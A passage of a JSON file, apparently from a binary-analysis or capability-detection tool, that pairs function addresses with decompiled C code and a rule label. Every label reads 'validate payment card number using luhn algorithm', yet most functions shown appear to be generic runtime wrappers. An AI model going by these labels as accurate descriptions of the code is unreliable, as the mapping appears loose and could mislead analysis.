        "decompiled_code": "\nuint __cdecl fcn.004541f5(int32_t *arg_8h, int32_t arg_ch, uint arg_10h, int32_t arg_14h)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    int32_t in_ECX;\n    \n    if (*arg_8h == 0) {\n        *arg_8h = arg_ch;\n        *(arg_8h + 1) = arg_10h;\n        arg_8h[3] = arg_14h;\n    }\n    else {\n        cVar2 = fcn.004483ac(arg_8h, arg_ch, arg_10h, arg_14h);\n        if (cVar2 == '\\0') {\n            iVar1 = *(in_ECX + 8);\n            *(iVar1 + 0x1c) = 1;\n            *(iVar1 + 0x18) = 0x16;\n            fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n            return 0;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 249
    },
    "00455b45": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00455b45(uint arg_8h, uint arg_ch, int32_t arg_10h, int32_t arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint uVar1;\n    uint *arg_8h_00;\n    uint *arg_ch_00;\n    uint *arg_1ch_00;\n    uint var_5ch;\n    uint var_44h;\n    uint var_40h;\n    uint *var_34h;\n    uint *var_30h;\n    uint *var_2ch;\n    uint *var_28h;\n    uint *var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    fcn.0043b732(arg_18h);\n    var_10h = arg_1ch;\n    var_ch = arg_14h;\n    var_8h = arg_10h;\n    var_20h = arg_8h;\n    var_1ch = arg_ch;\n    if ((arg_10h == 0) || (arg_14h == 0)) {\n        arg_1ch_00 = &var_5ch;\n        var_40h._0_1_ = 1;\n        var_44h = 0x16;\n        arg_ch_00 = NULL;\n        arg_8h_00 = NULL;\n        fcn.0043bac1(0, 0, 0, 0, 0, arg_1ch_00);\n        uVar1 = 0xffffffff;\n    }\n    else {\n        var_34h = &var_8h;\n        var_14h = arg_10h;\n        var_30h = &var_5ch;\n        var_18h = arg_10h;\n        var_2ch = &var_20h;\n        var_28h = &var_ch;\n        var_24h = &var_10h;\n        arg_1ch_00 = &var_14h;\n        arg_ch_00 = &var_34h;\n        arg_8h_00 = &var_18h;\n        uVar1 = fcn.0043c3de(arg_8h_00, arg_ch_00);\n    }\n    fcn.0043b78b(arg_8h_00, arg_ch_00, arg_1ch_00);\n    return uVar1;\n}\n",
        "token_count": 603
    },
    "00455be9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00455be9(uint arg_8h, uint arg_ch, int32_t arg_10h, int32_t arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint uVar1;\n    uint *arg_8h_00;\n    uint *arg_ch_00;\n    uint *arg_1ch_00;\n    uint var_5ch;\n    uint var_44h;\n    uint var_40h;\n    uint *var_34h;\n    uint *var_30h;\n    uint *var_2ch;\n    uint *var_28h;\n    uint *var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    fcn.0043b732(arg_18h);\n    var_10h = arg_1ch;\n    var_ch = arg_14h;\n    var_8h = arg_10h;\n    var_20h = arg_8h;\n    var_1ch = arg_ch;\n    if ((arg_10h == 0) || (arg_14h == 0)) {\n        arg_1ch_00 = &var_5ch;\n        var_40h._0_1_ = 1;\n        var_44h = 0x16;\n        arg_ch_00 = NULL;\n        arg_8h_00 = NULL;\n        fcn.0043bac1(0, 0, 0, 0, 0, arg_1ch_00);\n        uVar1 = 0xffffffff;\n    }\n    else {\n        var_34h = &var_8h;\n        var_14h = arg_10h;\n        var_30h = &var_5ch;\n        var_18h = arg_10h;\n        var_2ch = &var_20h;\n        var_28h = &var_ch;\n        var_24h = &var_10h;\n        arg_1ch_00 = &var_14h;\n        arg_ch_00 = &var_34h;\n        arg_8h_00 = &var_18h;\n        uVar1 = fcn.0043c494(arg_8h_00, arg_ch_00);\n    }\n    fcn.0043b78b(arg_8h_00, arg_ch_00, arg_1ch_00);\n    return uVar1;\n}\n",
        "token_count": 602
    },
    "00455c8d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00455c8d(uint arg_8h, uint arg_ch, int32_t arg_10h, int32_t arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint uVar1;\n    uint *arg_8h_00;\n    uint *arg_ch_00;\n    uint *arg_1ch_00;\n    uint var_5ch;\n    uint var_44h;\n    uint var_40h;\n    uint *var_34h;\n    uint *var_30h;\n    uint *var_2ch;\n    uint *var_28h;\n    uint *var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    fcn.0043b732(arg_18h);\n    var_10h = arg_1ch;\n    var_ch = arg_14h;\n    var_8h = arg_10h;\n    var_20h = arg_8h;\n    var_1ch = arg_ch;\n    if ((arg_10h == 0) || (arg_14h == 0)) {\n        arg_1ch_00 = &var_5ch;\n        var_40h._0_1_ = 1;\n        var_44h = 0x16;\n        arg_ch_00 = NULL;\n        arg_8h_00 = NULL;\n        fcn.0043bac1(0, 0, 0, 0, 0, arg_1ch_00);\n        uVar1 = 0xffffffff;\n    }\n    else {\n        var_34h = &var_8h;\n        var_14h = arg_10h;\n        var_30h = &var_5ch;\n        var_18h = arg_10h;\n        var_2ch = &var_20h;\n        var_28h = &var_ch;\n        var_24h = &var_10h;\n        arg_1ch_00 = &var_14h;\n        arg_ch_00 = &var_34h;\n        arg_8h_00 = &var_18h;\n        uVar1 = fcn.0043c328(arg_8h_00, arg_ch_00);\n    }\n    fcn.0043b78b(arg_8h_00, arg_ch_00, arg_1ch_00);\n    return uVar1;\n}\n",
        "token_count": 603
    },
    "00455d31": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00455d31(uint arg_8h, uint arg_ch, int32_t arg_10h, int32_t arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint uVar1;\n    uint *arg_8h_00;\n    uint *arg_ch_00;\n    uint *arg_1ch_00;\n    uint var_5ch;\n    uint var_44h;\n    uint var_40h;\n    uint *var_34h;\n    uint *var_30h;\n    uint *var_2ch;\n    uint *var_28h;\n    uint *var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    fcn.0043b732(arg_18h);\n    var_10h = arg_1ch;\n    var_ch = arg_14h;\n    var_8h = arg_10h;\n    var_20h = arg_8h;\n    var_1ch = arg_ch;\n    if ((arg_10h == 0) || (arg_14h == 0)) {\n        arg_1ch_00 = &var_5ch;\n        var_40h._0_1_ = 1;\n        var_44h = 0x16;\n        arg_ch_00 = NULL;\n        arg_8h_00 = NULL;\n        fcn.0043bac1(0, 0, 0, 0, 0, arg_1ch_00);\n        uVar1 = 0xffffffff;\n    }\n    else {\n        var_34h = &var_8h;\n        var_14h = arg_10h;\n        var_30h = &var_5ch;\n        var_18h = arg_10h;\n        var_2ch = &var_20h;\n        var_28h = &var_ch;\n        var_24h = &var_10h;\n        arg_1ch_00 = &var_14h;\n        arg_ch_00 = &var_34h;\n        arg_8h_00 = &var_18h;\n        uVar1 = fcn.0043c2cd(arg_8h_00, arg_ch_00);\n    }\n    fcn.0043b78b(arg_8h_00, arg_ch_00, arg_1ch_00);\n    return uVar1;\n}\n",
        "token_count": 603
    },
    "00455dd5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00455dd5(uint arg_8h, uint arg_ch, int32_t arg_10h, int32_t arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint uVar1;\n    uint *arg_8h_00;\n    uint *arg_ch_00;\n    uint *arg_1ch_00;\n    uint var_5ch;\n    uint var_44h;\n    uint var_40h;\n    uint *var_34h;\n    uint *var_30h;\n    uint *var_2ch;\n    uint *var_28h;\n    uint *var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    fcn.0043b732(arg_18h);\n    var_10h = arg_1ch;\n    var_ch = arg_14h;\n    var_8h = arg_10h;\n    var_20h = arg_8h;\n    var_1ch = arg_ch;\n    if ((arg_10h == 0) || (arg_14h == 0)) {\n        arg_1ch_00 = &var_5ch;\n        var_40h._0_1_ = 1;\n        var_44h = 0x16;\n        arg_ch_00 = NULL;\n        arg_8h_00 = NULL;\n        fcn.0043bac1(0, 0, 0, 0, 0, arg_1ch_00);\n        uVar1 = 0xffffffff;\n    }\n    else {\n        var_34h = &var_8h;\n        var_14h = arg_10h;\n        var_30h = &var_5ch;\n        var_18h = arg_10h;\n        var_2ch = &var_20h;\n        var_28h = &var_ch;\n        var_24h = &var_10h;\n        arg_1ch_00 = &var_14h;\n        arg_ch_00 = &var_34h;\n        arg_8h_00 = &var_18h;\n        uVar1 = fcn.0043c383(arg_8h_00, arg_ch_00);\n    }\n    fcn.0043b78b(arg_8h_00, arg_ch_00, arg_1ch_00);\n    return uVar1;\n}\n",
        "token_count": 602
    },
    "00455e79": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00455e79(uint arg_8h, uint arg_ch, int32_t arg_10h, int32_t arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint uVar1;\n    uint *arg_8h_00;\n    uint *arg_ch_00;\n    uint *arg_1ch_00;\n    uint var_5ch;\n    uint var_44h;\n    uint var_40h;\n    uint *var_34h;\n    uint *var_30h;\n    uint *var_2ch;\n    uint *var_28h;\n    uint *var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    fcn.0043b732(arg_18h);\n    var_10h = arg_1ch;\n    var_ch = arg_14h;\n    var_8h = arg_10h;\n    var_20h = arg_8h;\n    var_1ch = arg_ch;\n    if ((arg_10h == 0) || (arg_14h == 0)) {\n        arg_1ch_00 = &var_5ch;\n        var_40h._0_1_ = 1;\n        var_44h = 0x16;\n        arg_ch_00 = NULL;\n        arg_8h_00 = NULL;\n        fcn.0043bac1(0, 0, 0, 0, 0, arg_1ch_00);\n        uVar1 = 0xffffffff;\n    }\n    else {\n        var_34h = &var_8h;\n        var_14h = arg_10h;\n        var_30h = &var_5ch;\n        var_18h = arg_10h;\n        var_2ch = &var_20h;\n        var_28h = &var_ch;\n        var_24h = &var_10h;\n        arg_1ch_00 = &var_14h;\n        arg_ch_00 = &var_34h;\n        arg_8h_00 = &var_18h;\n        uVar1 = fcn.0043c439(arg_8h_00, arg_ch_00);\n    }\n    fcn.0043b78b(arg_8h_00, arg_ch_00, arg_1ch_00);\n    return uVar1;\n}\n",
        "token_count": 602
    },
    "00455f1d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.00455f1d(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h)\n\n{\n    uint uVar1;\n    uint var_28h;\n    \n    fcn.0043b732(arg_20h);\n    uVar1 = fcn.0043c8e2(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, &var_28h, arg_24h);\n    fcn.0043b78b();\n    return uVar1;\n}\n",
        "token_count": 158
    },
    "00455f61": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.00455f61(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h)\n\n{\n    uint uVar1;\n    uint var_28h;\n    \n    fcn.0043b732(arg_20h);\n    uVar1 = fcn.0043c9e3(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, &var_28h, arg_24h);\n    fcn.0043b78b();\n    return uVar1;\n}\n",
        "token_count": 157
    },
    "00455fa5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.00455fa5(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    uint uVar1;\n    uint var_28h;\n    \n    fcn.0043b732(arg_1ch);\n    uVar1 = fcn.0043d135(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, &var_28h, arg_20h);\n    fcn.0043b78b();\n    return uVar1;\n}\n",
        "token_count": 142
    },
    "00455fe6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.00455fe6(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    uint uVar1;\n    uint var_28h;\n    \n    fcn.0043b732(arg_1ch);\n    uVar1 = fcn.0043cdec(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, &var_28h, arg_20h);\n    fcn.0043b78b();\n    return uVar1;\n}\n",
        "token_count": 142
    },
    "00456027": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.00456027(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    uint uVar1;\n    uint var_28h;\n    \n    fcn.0043b732(arg_1ch);\n    uVar1 = fcn.0043d42c(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, &var_28h, arg_20h);\n    fcn.0043b78b();\n    return uVar1;\n}\n",
        "token_count": 142
    },
    "00456068": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.00456068(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    uint uVar1;\n    uint var_28h;\n    \n    fcn.0043b732(arg_1ch);\n    uVar1 = fcn.0043d2a9(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, &var_28h, arg_20h);\n    fcn.0043b78b();\n    return uVar1;\n}\n",
        "token_count": 143
    },
    "004560a9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.004560a9(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    uint uVar1;\n    uint var_28h;\n    \n    fcn.0043b732(arg_1ch);\n    uVar1 = fcn.0043cf89(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, &var_28h, arg_20h);\n    fcn.0043b78b();\n    return uVar1;\n}\n",
        "token_count": 142
    },
    "004560ea": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.004560ea(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    uint uVar1;\n    uint var_28h;\n    \n    fcn.0043b732(arg_1ch);\n    uVar1 = fcn.0043d4cb(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, &var_28h, arg_20h);\n    fcn.0043b78b();\n    return uVar1;\n}\n",
        "token_count": 142
    },
    "004565ef": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004565ef(uint arg_8h)\n\n{\n    uint *puVar1;\n    uint *in_ECX;\n    \n    puVar1 = in_ECX + 1;\n    if (in_ECX != puVar1) {\n        do {\n            *in_ECX = arg_8h;\n            in_ECX = in_ECX + 1;\n        } while (in_ECX != puVar1);\n    }\n    return;\n}\n",
        "token_count": 100
    },
    "00456d5c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00456d5c(uint arg_8h)\n\n{\n    fcn.00456b28(arg_8h, 0, 0);\n    return;\n}\n",
        "token_count": 42
    },
    "00456d72": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00456d72(uint arg_8h)\n\n{\n    fcn.00456b28(arg_8h, 1, 0);\n    return;\n}\n",
        "token_count": 41
    },
    "00457031": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00457031(uint *arg_8h, uint arg_ch, uint *arg_10h)\n\n{\n    fcn.00462289(*arg_8h, arg_ch, *arg_10h);\n    return;\n}\n",
        "token_count": 55
    },
    "004620cd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Type propagation algorithm not settling\n\nint32_t __cdecl fcn.004620cd(int32_t *arg_8h, int32_t *arg_ch)\n\n{\n    char cVar1;\n    code *pcVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    char *pcVar5;\n    int32_t iVar6;\n    char **ppcVar7;\n    char **ppcVar8;\n    char **var_20h;\n    char **var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    char *var_10h;\n    char *var_ch;\n    char *var_8h;\n    char *var_4h;\n    \n    if (arg_ch == NULL) {\n        puVar3 = fcn.0043bcb5();\n        iVar6 = 0x16;\n        *puVar3 = 0x16;\n        fcn.0043bb3e();\n    }\n    else {\n        *arg_ch = 0;\n        var_18h = 0;\n        var_1ch = NULL;\n        var_20h = NULL;\n        iVar6 = *arg_8h;\n        ppcVar8 = var_20h;\n        while (var_20h = ppcVar8,  iVar6 != 0) {\n            var_4h = CONCAT13(var_4h >> 0x18, 0x3f2a);\n            iVar6 = fcn.0046e110(iVar6, &var_4h);\n            if (iVar6 == 0) {\n                iVar6 = fcn.0046143d(*arg_8h, 0, 0, &var_20h);\n            }\n            else {\n                iVar6 = fcn.004615a2(*arg_8h, iVar6, &var_20h);\n            }\n            if (iVar6 != 0) goto code_r0x004611ef;\n            arg_8h = arg_8h + 1;\n            ppcVar8 = var_20h;\n            iVar6 = *arg_8h;\n        }\n        iVar6 = (var_1ch - ppcVar8 >> 2) + 1;\n        var_8h = NULL;\n        for (ppcVar7 = ppcVar8; ppcVar7 != var_1ch; ppcVar7 = ppcVar7 + 1) {\n            pcVar5 = *ppcVar7;\n            var_ch = pcVar5 + 1;\n            do {\n                cVar1 = *pcVar5;\n                pcVar5 = pcVar5 + 1;\n            } while (cVar1 != '\\0');\n            var_8h = pcVar5 + var_8h + (1 - var_ch);\n        }\n        iVar4 = fcn.00457505(iVar6, var_8h, 1);\n        ppcVar7 = var_1ch;\n        if (iVar4 == 0) {\n            fcn.0045d185(0);\n            iVar6 = -1;\ncode_r0x004611ef:\n            fcn.00461bca();\n        }\n        else {\n            var_4h = iVar4 + iVar6 * 4;\n            var_10h = var_4h;\n            if (ppcVar8 != var_1ch) {\n                var_14h = iVar4 - ppcVar8;\n                do {\n                    var_ch = *ppcVar8;\n                    pcVar5 = var_ch + 1;\n                    do {\n                        cVar1 = *var_ch;\n                        var_ch = var_ch + 1;\n                    } while (cVar1 != '\\0');\n                    var_ch = var_ch + (1 - pcVar5);\n                    iVar6 = fcn.0043c04a(var_4h, var_8h + (var_10h - var_4h), *ppcVar8, var_ch);\n                    if (iVar6 != 0) {\n                        fcn.0043bb6b(0, 0, 0, 0, 0);\n                        pcVar2 = swi(3);\n                        iVar6 = (*pcVar2)();\n                        return iVar6;\n                    }\n                    *(var_14h + ppcVar8) = var_4h;\n                    ppcVar8 = ppcVar8 + 1;\n                    var_4h = var_4h + var_ch;\n                } while (ppcVar8 != ppcVar7);\n            }\n            *arg_ch = iVar4;\n            fcn.0045d185(0);\n            fcn.00461bca();\n            iVar6 = 0;\n        }\n    }\n    return iVar6;\n}\n",
        "token_count": 1030
    },
    "00457828": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.00457828(int16_t *arg_8h)\n\n{\n    int16_t iVar1;\n    int16_t iVar2;\n    code *pcVar3;\n    int32_t *piVar4;\n    int32_t arg_8h_00;\n    int32_t iVar5;\n    int16_t *piVar6;\n    int16_t *piVar7;\n    int32_t iVar8;\n    uint var_ch;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    iVar8 = 0;\n    iVar2 = *arg_8h;\n    piVar7 = arg_8h;\n    while (iVar2 != 0) {\n        if (iVar2 != 0x3d) {\n            iVar8 = iVar8 + 1;\n        }\n        piVar6 = piVar7;\n        do {\n            iVar2 = *piVar6;\n            piVar6 = piVar6 + 1;\n        } while (iVar2 != 0);\n        piVar7 = piVar7 + (piVar6 - (piVar7 + 1) >> 1) + 1;\n        iVar2 = *piVar7;\n    }\n    piVar4 = fcn.00460ec9(iVar8 + 1, 4);\n    if (piVar4 == NULL) {\n        fcn.0045d185(0);\n        piVar4 = NULL;\n    }\n    else {\n        iVar2 = *arg_8h;\n        var_8h = piVar4;\n        while (iVar2 != 0) {\n            piVar7 = arg_8h;\n            do {\n                iVar1 = *piVar7;\n                piVar7 = piVar7 + 1;\n            } while (iVar1 != 0);\n            iVar8 = (piVar7 - (arg_8h + 1) >> 1) + 1;\n            if (iVar2 != 0x3d) {\n                arg_8h_00 = fcn.00460ec9(iVar8, 2);\n                if (arg_8h_00 == 0) {\n                    fcn.00457975(piVar4);\n                    fcn.0045d185(0);\n                    fcn.0045d185(0);\n                    return NULL;\n                }\n                iVar5 = fcn.0043be56(arg_8h_00, iVar8, arg_8h);\n                if (iVar5 != 0) {\n                    fcn.0043bb6b(0, 0, 0, 0, 0);\n                    pcVar3 = swi(3);\n                    piVar4 = (*pcVar3)();\n                    return piVar4;\n                }\n                *var_8h = arg_8h_00;\n                var_8h = var_8h + 1;\n                fcn.0045d185(0);\n            }\n            arg_8h = arg_8h + iVar8;\n            iVar2 = *arg_8h;\n        }\n        fcn.0045d185(0);\n    }\n    return piVar4;\n}\n",
        "token_count": 683
    },
    "00457ae2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00457ae2(uint *arg_8h, uint *arg_ch, uint *arg_10h)\n\n{\n    fcn.0045acc6(*arg_8h, *arg_ch, *arg_10h);\n    return;\n}\n",
        "token_count": 59
    },
    "00457b00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00457b00(uint *arg_8h, uint *arg_ch, uint *arg_10h)\n\n{\n    fcn.0043be56(*arg_8h, *arg_ch, *arg_10h);\n    return;\n}\n",
        "token_count": 59
    },
    "00457b54": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00457b54(code *arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t in_ECX;\n    int32_t *in_FS_OFFSET;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x47a41a;\n    var_ch = *in_FS_OFFSET;\n    uVar2 = *0x6cade0 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    iVar1 = in_ECX + 4;\n    for (; in_ECX != iVar1; in_ECX = in_ECX + 4) {\n        (**0x47b3f8)(in_ECX, uVar2);\n        (*arg_8h)();\n    }\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 203
    },
    "00457bac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00457bac(code *arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t in_ECX;\n    int32_t *in_FS_OFFSET;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x47a437;\n    var_ch = *in_FS_OFFSET;\n    uVar2 = *0x6cade0 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    iVar1 = in_ECX + 4;\n    for (; in_ECX != iVar1; in_ECX = in_ECX + 4) {\n        (**0x47b3f8)(in_ECX, uVar2);\n        (*arg_8h)();\n    }\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 201
    },
    "00457d1f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00457d1f(uint arg_8h)\n\n{\n    uint *puVar1;\n    uint *in_ECX;\n    \n    puVar1 = in_ECX + 1;\n    if (in_ECX != puVar1) {\n        do {\n            *in_ECX = arg_8h;\n            in_ECX = in_ECX + 1;\n        } while (in_ECX != puVar1);\n    }\n    return;\n}\n",
        "token_count": 102
    },
    "00457d3b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00457d3b(uint arg_8h)\n\n{\n    uint *puVar1;\n    uint *in_ECX;\n    \n    puVar1 = in_ECX + 1;\n    if (in_ECX != puVar1) {\n        do {\n            *in_ECX = arg_8h;\n            in_ECX = in_ECX + 1;\n        } while (in_ECX != puVar1);\n    }\n    return;\n}\n",
        "token_count": 102
    },
    "00457d96": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.00457d96(void)\n\n{\n    int32_t unaff_EBP;\n    uint var_4h;\n    \n    fcn.00476b23(0);\n    *(unaff_EBP + -4) = 0;\n    fcn.00457c04(0x6ccf9c);\n    *(unaff_EBP + -4) = 1;\n    fcn.00457c1f(0x6ccfa0);\n    fcn.00457946(*0x6ccfa8);\n    fcn.00457975(*0x6ccfa4);\n    fcn.00476af1();\n    return;\n}\n",
        "token_count": 161
    },
    "004584f8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004584f8(uint arg_8h)\n\n{\n    uint *puVar1;\n    uint *in_ECX;\n    \n    puVar1 = in_ECX + 1;\n    if (in_ECX != puVar1) {\n        do {\n            *in_ECX = arg_8h;\n            in_ECX = in_ECX + 1;\n        } while (in_ECX != puVar1);\n    }\n    return;\n}\n",
        "token_count": 101
    },
    "0045877f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045877f(uint arg_8h)\n\n{\n    uint *puVar1;\n    uint *in_ECX;\n    \n    puVar1 = in_ECX + 1;\n    if (in_ECX != puVar1) {\n        do {\n            *in_ECX = arg_8h;\n            in_ECX = in_ECX + 1;\n        } while (in_ECX != puVar1);\n    }\n    return;\n}\n",
        "token_count": 101
    },
    "0045897d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045897d(code **arg_8h, code **arg_ch)\n\n{\n    code *pcVar1;\n    \n    if (arg_8h != arg_ch) {\n        do {\n            pcVar1 = *arg_8h;\n            if (pcVar1 != NULL) {\n                (**0x47b3f8)();\n                (*pcVar1)();\n            }\n            arg_8h = arg_8h + 1;\n        } while (arg_8h != arg_ch);\n    }\n    return;\n}\n",
        "token_count": 118
    },
    "0045aaad": {
        "rules": [
